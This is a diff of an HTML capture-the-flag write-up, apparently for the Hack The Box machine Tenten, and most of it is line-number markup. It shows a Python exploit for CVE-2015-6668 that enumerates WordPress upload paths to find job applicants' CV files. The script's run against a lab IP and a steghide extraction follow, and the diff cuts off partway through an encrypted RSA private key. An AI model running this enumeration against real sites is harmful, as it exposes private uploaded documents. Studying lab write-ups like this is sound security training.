+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">CVE-2015-6668
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Title: CV filename disclosure on Job-Manager WP Plugin
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Author: Evangelos Mourikis
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Blog: https://vagmour.eu
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Plugin URL: http://www.wp-jobmanager.com
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Versions: &lt;=0.7.25
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>website <span style="color:#ff79c6">=</span> raw_input(<span style="color:#f1fa8c">&#39;Enter a vulnerable website: &#39;</span>)
-</span></span><span style="display:flex;"><span>filename <span style="color:#ff79c6">=</span> raw_input(<span style="color:#f1fa8c">&#39;Enter a file name: &#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>filename2 <span style="color:#ff79c6">=</span> filename<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34; &#34;</span>, <span style="color:#f1fa8c">&#34;-&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> year <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">2017</span>,<span style="color:#bd93f9">2018</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">4</span>,<span style="color:#bd93f9">5</span>):
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> extension <span style="color:#ff79c6">in</span> {<span style="color:#f1fa8c">&#39;doc&#39;</span>,<span style="color:#f1fa8c">&#39;pdf&#39;</span>,<span style="color:#f1fa8c">&#39;docx&#39;</span>,<span style="color:#f1fa8c">&#39;jpg&#39;</span>,<span style="color:#f1fa8c">&#39;jpeg&#39;</span>,<span style="color:#f1fa8c">&#39;png&#39;</span>,<span style="color:#f1fa8c">&#39;txt&#39;</span> }:
-</span></span><span style="display:flex;"><span>            URL <span style="color:#ff79c6">=</span> website <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/wp-content/uploads/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(year) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{:02}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(i) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> filename2 <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;.&#34;</span> <span style="color:#ff79c6">+</span> extension
-</span></span><span style="display:flex;"><span>            req <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(URL)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> req<span style="color:#ff79c6">.</span>status_code<span style="color:#ff79c6">==</span><span style="color:#bd93f9">200</span>:
-</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;[+] URL of CV found! &#34;</span> <span style="color:#ff79c6">+</span> URL
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
+
+<span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">CVE-2015-6668
+</span><span style="color:#f1fa8c">Title: CV filename disclosure on Job-Manager WP Plugin
+</span><span style="color:#f1fa8c">Author: Evangelos Mourikis
+</span><span style="color:#f1fa8c">Blog: https://vagmour.eu
+</span><span style="color:#f1fa8c">Plugin URL: http://www.wp-jobmanager.com
+</span><span style="color:#f1fa8c">Versions: &lt;=0.7.25
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+website <span style="color:#ff79c6">=</span> raw_input(<span style="color:#f1fa8c">&#39;Enter a vulnerable website: &#39;</span>)
+filename <span style="color:#ff79c6">=</span> raw_input(<span style="color:#f1fa8c">&#39;Enter a file name: &#39;</span>)
+
+filename2 <span style="color:#ff79c6">=</span> filename<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34; &#34;</span>, <span style="color:#f1fa8c">&#34;-&#34;</span>)
+
+<span style="color:#ff79c6">for</span> year <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">2017</span>,<span style="color:#bd93f9">2018</span>):
+    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">4</span>,<span style="color:#bd93f9">5</span>):
+        <span style="color:#ff79c6">for</span> extension <span style="color:#ff79c6">in</span> {<span style="color:#f1fa8c">&#39;doc&#39;</span>,<span style="color:#f1fa8c">&#39;pdf&#39;</span>,<span style="color:#f1fa8c">&#39;docx&#39;</span>,<span style="color:#f1fa8c">&#39;jpg&#39;</span>,<span style="color:#f1fa8c">&#39;jpeg&#39;</span>,<span style="color:#f1fa8c">&#39;png&#39;</span>,<span style="color:#f1fa8c">&#39;txt&#39;</span> }:
+            URL <span style="color:#ff79c6">=</span> website <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/wp-content/uploads/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(year) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{:02}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(i) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> filename2 <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;.&#34;</span> <span style="color:#ff79c6">+</span> extension
+            req <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(URL)
+            <span style="color:#ff79c6">if</span> req<span style="color:#ff79c6">.</span>status_code<span style="color:#ff79c6">==</span><span style="color:#bd93f9">200</span>:
+                <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;[+] URL of CV found! &#34;</span> <span style="color:#ff79c6">+</span> URL
+</code></pre></td></tr></table>
 </div>
 </div><p>We execute the script:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ python2 fetch_uploads.py
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>CVE-2015-6668
-</span></span><span style="display:flex;"><span>Title: CV filename disclosure on Job-Manager WP Plugin
-</span></span><span style="display:flex;"><span>Author: Evangelos Mourikis
-</span></span><span style="display:flex;"><span>Blog: https://vagmour.eu
-</span></span><span style="display:flex;"><span>Plugin URL: http://www.wp-jobmanager.com
-</span></span><span style="display:flex;"><span>Versions: &lt;<span style="color:#ff79c6">=</span>0.7.25
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Enter a vulnerable website: http://10.10.10.10
-</span></span><span style="display:flex;"><span>Enter a file name: HackerAccessGranted
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.docx
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.doc
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpeg
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.pdf
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.png
-</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/tenten$ python2 fetch_uploads.py
+
+CVE-2015-6668
+Title: CV filename disclosure on Job-Manager WP Plugin
+Author: Evangelos Mourikis
+Blog: https://vagmour.eu
+Plugin URL: http://www.wp-jobmanager.com
+Versions: &lt;<span style="color:#ff79c6">=</span>0.7.25
+
+Enter a vulnerable website: http://10.10.10.10
+Enter a file name: HackerAccessGranted
+<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.docx
+<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.doc
+<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpeg
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.pdf
+<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.txt
+<span style="color:#ff79c6">[</span>E<span style="color:#ff79c6">]</span> not found http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.png
+ctf@014202efa8c8:~/htb/tenten$ wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+</code></pre></td></tr></table>
 </div>
 </div><p>The image contains some steganography, we use steghide to discover some rsa key</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ sudo apt install steghide
-</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ steghide extract -sf HackerAccessGranted.jpg
-</span></span><span style="display:flex;"><span>Enter passphrase:
-</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#f1fa8c">&#34;id_rsa&#34;</span>.
-</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ cat id_rsa
-</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
-</span></span><span style="display:flex;"><span>Proc-Type: 4,ENCRYPTED
-</span></span><span style="display:flex;"><span>DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
-</span></span><span style="display:flex;"><span>tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
-</span></span><span style="display:flex;"><span>1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
-</span></span><span style="display:flex;"><span>K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
-</span></span><span style="display:flex;"><span>SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
-</span></span><span style="display:flex;"><span>WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
-</span></span><span style="display:flex;"><span>VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
-</span></span><span style="display:flex;"><span>J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
-</span></span><span style="display:flex;"><span>AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
-</span></span><span style="display:flex;"><span>2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
-</span></span><span style="display:flex;"><span>6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
-</span></span><span style="display:flex;"><span>pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
-</span></span><span style="display:flex;"><span>tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
-</span></span><span style="display:flex;"><span>KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
